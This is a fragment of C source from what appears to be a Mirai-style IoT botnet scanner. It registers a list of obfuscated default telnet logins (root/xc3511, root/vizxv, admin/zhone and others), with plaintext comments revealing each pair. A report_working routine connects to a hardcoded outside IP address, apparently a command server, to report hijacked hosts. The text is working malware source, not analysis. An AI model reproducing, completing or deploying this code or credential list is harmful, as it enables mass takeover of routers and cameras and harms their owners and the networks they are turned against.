...
void scanner_init(void)
{
    ...
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x4D\x4E\x4D\x49\x47\x5B", 10); // root solokey
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 10); // root root
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13\x22", 10); // root Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13\x22", 10); // root xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x22", 10); // root 12345
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4A\x4D\x4C\x47\x22", 10); // root zhone
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54\x22", 10); // root vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x5B\x51\x13\x10\x11\x16\x17\x14\x22", 10); // root ys123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x65\x6F\x1A\x13\x1A\x10", 10); // root GM8182
    ...
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x58\x4A\x4D\x4C\x47\x22", 10); // admin zhone
    ...
    add_auth_entry("\x56\x47\x4E\x4C\x47\x56\x43\x46\x4F\x4B\x4C", "\x56\x47\x4E\x4C\x47\x56\x43\x46\x4F\x4B\x4C", 10); // telnetadmin telnetadmin
...
static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    ...
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(194,180,224,124);
